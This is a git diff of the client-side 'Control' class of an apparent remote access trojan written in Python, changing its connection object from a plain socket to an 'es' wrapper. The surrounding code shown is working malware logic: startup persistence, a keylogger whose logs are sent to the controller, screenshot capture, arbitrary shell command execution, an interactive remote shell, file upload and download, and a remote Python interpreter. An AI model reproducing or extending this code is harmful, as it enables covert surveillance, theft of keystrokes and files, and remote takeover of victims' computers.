@@ -32,8 +32,8 @@ from src.client.keylogger import Keylogger
 
 
 class Control(metaclass=abc.ABCMeta):
-    def __init__(self, _socket):
-        self.socket = _socket
+    def __init__(self, _es):
+        self.es = _es
         self.keylogger = Keylogger()
         self.disabled_processes = {}
 
@@ -62,24 +62,24 @@ class Control(metaclass=abc.ABCMeta):
             else:
                 p.add_startup()
 
-            self.socket.send_json(SUCCESS)
+            self.es.send_json(SUCCESS)
         except errors.ClientSocket.Persistence.StartupError as e:
-            self.socket.send_json(ERROR, str(e))
+            self.es.send_json(ERROR, str(e))
         except NotImplemented:
-            self.socket.send_json(ERROR, "Command not supported")
+            self.es.send_json(ERROR, "Command not supported")
 
     def heartbeat(self):
-        self.socket.send_json(SUCCESS)
+        self.es.send_json(SUCCESS)
 
     def close(self):
-        self.socket.close()
+        self.es.socket.close()
         sys.exit(0)
 
     def keylogger_dump(self):
         try:
-            self.socket.sendall_json(SUCCESS, helper.decode(self.keylogger.dump_logs().encode()))
+            self.es.sendall_json(SUCCESS, helper.decode(self.keylogger.dump_logs().encode()))
         except errors.ClientSocket.KeyloggerError as e:
-            self.socket.send_json(ERROR, str(e))
+            self.es.send_json(ERROR, str(e))
 
     def keylogger_start(self):
         self.keylogger.start()
@@ -87,9 +87,9 @@ class Control(metaclass=abc.ABCMeta):
     def keylogger_stop(self):
         try:
             self.keylogger.stop()
-            self.socket.send_json(SUCCESS)
+            self.es.send_json(SUCCESS)
         except errors.ClientSocket.KeyloggerError as e:
-            self.socket.send_json(ERROR, str(e))
+            self.es.send_json(ERROR, str(e))
 
     def screenshot(self):
         if platforms.OS == platforms.LINUX:
@@ -106,7 +106,7 @@ class Control(metaclass=abc.ABCMeta):
 
                 dsp.close()
             except Exception as e:
-                self.socket.send_json(ERROR, str(e))
+                self.es.send_json(ERROR, str(e))
                 return
         else:
             image = pyscreeze.screenshot()
@@ -115,22 +115,22 @@ class Control(metaclass=abc.ABCMeta):
             image.save(_bytes, format="PNG")
             image_bytes = _bytes.getvalue()
 
-        self.socket.sendall_json(SERVER_SCREENSHOT, image_bytes, len(image_bytes), is_bytes=True)
+        self.es.sendall_json(SERVER_SCREENSHOT, image_bytes, len(image_bytes), is_bytes=True)
 
     def run_command(self, command):
         _command = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                     shell=True)
         output = _command.stdout.read() + _command.stderr.read()
 
-        self.socket.sendall_json(SUCCESS, helper.decode(output))
+        self.es.sendall_json(SUCCESS, helper.decode(output))
 
     def command_shell(self):
         orig_dir = os.getcwd()
 
-        self.socket.send_json(SERVER_SHELL_DIR, orig_dir)
+        self.es.send_json(SERVER_SHELL_DIR, orig_dir)
 
         while True:
-            data = self.socket.recv_json()
+            data = self.es.recv_json()
 
             if data["key"] == CLIENT_SHELL_CMD:
                 command_request = data["value"]
@@ -147,50 +147,50 @@ class Control(metaclass=abc.ABCMeta):
                                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                    stdin=subprocess.PIPE, shell=True)
                     except FileNotFoundError as e:
-                        self.socket.sendall_json(SERVER_COMMAND_RSP, str(e))
+                        self.es.sendall_json(SERVER_COMMAND_RSP, str(e))
                     else:
                         if command.stderr.read().decode() == "":  # if there is no error
                             output = (command.stdout.read()).decode().splitlines()[0]  # decode and remove new line
                             os.chdir(output)  # change directory
 
-                            self.socket.send_json(SERVER_SHELL_DIR, os.getcwd())
+                            self.es.send_json(SERVER_SHELL_DIR, os.getcwd())
                         else:
-                            self.socket.send_json(SERVER_COMMAND_RSP, helper.decode(command.stderr.read()))
+                            self.es.send_json(SERVER_COMMAND_RSP, helper.decode(command.stderr.read()))
                 else:
                     command = subprocess.Popen(command_request, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE,
                                                shell=True)
                     output = command.stdout.read() + command.stderr.read()
 
-                    self.socket.sendall_json(SERVER_COMMAND_RSP, helper.decode(output))
+                    self.es.sendall_json(SERVER_COMMAND_RSP, helper.decode(output))
 
             elif data["key"] == CLIENT_SHELL_LEAVE:
                 os.chdir(orig_dir)  # change directory back to original
                 break
 
     def upload(self, buffer, file_path):
-        output = self.socket.recvall(buffer)
+        output = self.es.recvall(buffer)
 
         try:
             with open(file_path, "wb") as file:
                 file.write(output)
 
-            self.socket.send_json(SUCCESS, f"Total bytes received by client: {len(output)}")
+            self.es.send_json(SUCCESS, f"Total bytes received by client: {len(output)}")
         except Exception as e:
-            self.socket.send_json(ERROR, f"Could not open file {e}")
+            self.es.send_json(ERROR, f"Could not open file {e}")
 
     def receive(self, file):
         try:
             with open(file, "rb") as _file:
                 data = _file.read()
 
-            self.socket.sendall_json(SERVER_FILE_RECV, data, len(data), is_bytes=True)
+            self.es.sendall_json(SERVER_FILE_RECV, data, len(data), is_bytes=True)
         except Exception as e:
-            self.socket.send_json(ERROR, f"Error reading file {e}")
+            self.es.send_json(ERROR, f"Error reading file {e}")
 
     def python_interpreter(self):
         while True:
-            command = self.socket.recv_json()
+            command = self.es.recv_json()
 
             if command["key"] == CLIENT_PYTHON_INTERPRETER_CMD:
                 old_stdout = sys.stdout
@@ -210,9 +210,9 @@ class Control(metaclass=abc.ABCMeta):
                     sys.stdout = old_stdout
 
                 if error:
-                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP, helper.decode(error.encode()))
+                    self.es.sendall_json(SERVER_PYTHON_INTERPRETER_RSP, helper.decode(error.encode()))
                 else:
-                    self.socket.sendall_json(SERVER_PYTHON_INTERPRETER_RSP,
-                                             helper.decode(redirected_output.getvalue().encode()))
+                    self.es.sendall_json(SERVER_PYTHON_INTERPRETER_RSP,
+                                         helper.decode(redirected_output.getvalue().encode()))
             elif command["key"] == CLIENT_PYTHON_INTERPRETER_LEAVE:
                 break
